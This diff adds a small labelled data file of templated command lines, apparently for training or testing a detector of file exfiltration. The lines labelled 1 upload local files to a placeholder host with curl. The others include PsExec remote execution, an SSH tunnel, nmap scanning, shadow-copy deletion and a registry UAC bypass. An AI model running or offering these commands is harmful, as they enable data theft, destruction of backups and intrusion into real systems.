@@ -1,0 +1,16 @@
+1	cmd /c "curl -v -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+1	powershell -c "curl -v -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+1	curl.exe -v -X POST http://${ip_address}/upload -F files=@${source_file_path}
+1	cmd /c "curl.exe -v -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+1	powershell -c "curl.exe -v -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+1	curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
+1	cmd /c "curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+1	powershell -c "curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+0	cmd /c "plink -ssh -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+0	cmd /c "systeminfo.exe"
+0	wmic.exe os get Name
+0	nmap -p- -sC -O -A ${ip_address} 2> /dev/null
+0	cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+0	cmd /c "vssadmin delete shadows /all"
+0	powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+0	powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f"
